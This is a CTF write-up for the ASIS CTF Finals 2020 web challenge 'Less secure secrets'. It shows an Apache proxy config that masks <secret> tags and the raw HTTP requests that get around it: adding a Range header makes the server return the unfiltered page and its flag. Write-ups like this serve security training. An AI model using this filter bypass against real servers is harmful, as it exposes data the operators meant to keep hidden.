<h1>ASIS CTF Finals 2020 â€“ Less secure secrets</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 71</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>Let's warm up!</p>
  
  <p>https://securesecrets.asisctf.com/</p>
</blockquote>

<h2>Solution</h2>

<p>The website shows a page like the following.</p>

<p>```html
<html>
    <head>
        <title>Secret protector</title> <br />
        <link href="https://fonts.googleapis.com/css2?family=Chilanka&amp;display=swap" rel="stylesheet">
        <style>
            body{
                background-color: #262428;
            }
            .title-protection{
                font-family: "Chilanka";
                font-size: 40px;
                font-weight: bold;
                color: white;
                width: 100%;
                text-align: center;
                height: 400px;
                line-height: 400px;
            }
            iframe{
                width: 400px;
                height: 300px;
                margin-top: -50px;
            }
            .frame-holder{
                text-align: center;
                width: 100%;
            }
        </style>
    </head>
    <body>
        <div>
            <div class="title-protection">
                Apache powered secret protection. Secure your secrets, with our sample <a href="configs.zip">configs</a>.
            </div>
            <div class="frame-holder">
                <iframe src="/secret.html">
                </iframe>
            </div>
            <div></p>

<pre><code>        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;
</code></pre>

<p></html>
```</p>

<p>You can discover the <a href="configs.zip">configs.zip</a> file with configurations.</p>

<p>Analyzing <a href="configs/config/proxy/apache_ctf.conf"><code>configs/config/proxy/apache_ctf.conf</code></a> file, you can find a rule that substitute a <code>secret</code> tag.</p>

<p>```
ServerName proxy</p>

<p>LoadModule deflate<em>module /usr/local/apache2/modules/mod</em>deflate.so
LoadModule proxy<em>module /usr/local/apache2/modules/mod</em>proxy.so
LoadModule substitute<em>module /usr/local/apache2/modules/mod</em>substitute.so
LoadModule proxy<em>http</em>module /usr/local/apache2/modules/mod<em>proxy</em>http.so</p>

<p><VirtualHost *:80>
    RequestHeader unset Accept-Encoding
    ProxyPass / http://main/
    ProxyPassReverse / http://main/</p>

<pre><code>SetEnvIf X-Http-Method-Override ".+" X-Http-Method-Override=$0
RequestHeader set X-Http-Method-Override %{X-Http-Method-Override}e env=X-Http-Method-Override

SetEnvIf Range ".+" Range=$0
RequestHeader set Range %{Range}e env=Range

SetEnvIf Via ".+" Via=$0
RequestHeader set Via %{Via}e env=Via

SetEnvIf If-Match ".+" If-Match=$0
RequestHeader set If-Match %{If-Match}e env=If-Match

&lt;if "%{REMOTE_ADDR} != '127.0.0.1'"&gt;
    AddOutputFilterByType INFLATE;SUBSTITUTE;DEFLATE text/html
    Substitute s|&lt;secret&gt;(.*)&lt;/secret&gt;|Protected|i
&lt;/if&gt;

# Send apache logs to stdout and stderr
CustomLog /proc/self/fd/1 common
ErrorLog /proc/self/fd/2
</code></pre>

<p></VirtualHost>
```</p>

<p>So if you try to read <code>secret.html</code> page you will obtain the content with the substitution applied.</p>

<p>```
GET /secret.html HTTP/1.1
Host: securesecrets.asisctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://securesecrets.asisctf.com/
Connection: close</p>

<p>HTTP/1.1 200 OK
date: Fri, 11 Dec 2020 23:23:18 GMT
server: Apache/2.4.46 (Unix)
last-modified: Fri, 11 Dec 2020 14:56:25 GMT
etag: "36b-5b6317f19aaf3"
accept-ranges: bytes
content-type: text/html
vary: Accept-Encoding
connection: close
Content-Length: 792</p>

<p><html>
    <head>
        <title>very secure key</title> <br />
        <link href="https://fonts.googleapis.com/css2?family=Chilanka&amp;display=swap" rel="stylesheet">
        <style>
            body{
                background-color:   #2e2e2e;
            }
            .title-protection{
                font-family: "Chilanka";
                font-size: 20px;
                font-weight: bold;
                color: white;
                width: 100%;
                padding: 40px 100px;
                box-sizing: border-box;
                text-align: center;
                height: 400px;
            }
        </style>
    </head>
    <body>
        <div>
            <div class="title-protection">
                Protected
            </div>
        </div>
    </body>
</html>
```</p>

<p>You can use the <code>Range</code> HTTP header to exfiltrate the original <code>secret.html</code> page.</p>

<p>```
GET /secret.html HTTP/1.1
Host: securesecrets.asisctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://securesecrets.asisctf.com/
Connection: close
Range: bytes=0-1023</p>

<p>HTTP/1.1 206 Partial Content
date: Fri, 11 Dec 2020 23:25:00 GMT
server: Apache/2.4.46 (Unix)
last-modified: Fri, 11 Dec 2020 14:56:25 GMT
etag: "36b-5b6317f19aaf3"
accept-ranges: bytes
content-length: 875
content-range: bytes 0-874/875
content-type: text/html
connection: close</p>

<p><html>
    <head>
        <title>very secure key</title> <br />
        <link href="https://fonts.googleapis.com/css2?family=Chilanka&amp;display=swap" rel="stylesheet">
        <style>
            body{
                background-color:   #2e2e2e;
            }
            .title-protection{
                font-family: "Chilanka";
                font-size: 20px;
                font-weight: bold;
                color: white;
                width: 100%;
                padding: 40px 100px;
                box-sizing: border-box;
                text-align: center;
                height: 400px;
            }
        </style>
    </head>
    <body>
        <div>
            <div class="title-protection">
                <secret>What??? You want the first secret? I think it's "ASIS{L3T5<em>S74rT</em>7h3_fUn}".</secret>
            </div>
        </div>
    </body>
</html>
```</p>

<p>The flag is the following.</p>

<p><code>
ASIS{L3T5_S74rT_7h3_fUn}
</code></p>
